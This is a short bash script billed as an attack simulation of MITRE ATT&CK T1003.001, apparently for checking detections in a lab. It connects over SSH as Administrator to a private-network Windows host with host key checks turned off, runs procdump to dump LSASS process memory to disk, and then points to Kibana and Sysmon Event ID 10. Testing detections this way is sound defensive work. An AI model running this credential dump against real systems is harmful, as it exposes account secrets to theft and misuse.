#!/bin/bash
# Attack Simulation: LSASS Memory Dump
# MITRE ATT&CK: T1003.001
# Usage: Run procdump on target Windows machine
# Requirements: procdump64.exe on target

TARGET_IP="192.168.56.11"
WIN_USER="Administrator"
WIN_PASS="provide_password_here"

echo "[*] Dumping LSASS memory on $TARGET_IP"
sshpass -p "$WIN_PASS" ssh -o StrictHostKeyChecking=no ${WIN_USER}@${TARGET_IP} \
    "C:\\procdump\\procdump64.exe -accepteula -ma lsass.exe C:\\lsass.dmp"

echo "[*] Attack complete - check Kibana for Sysmon Event ID 10 targeting lsass.exe"
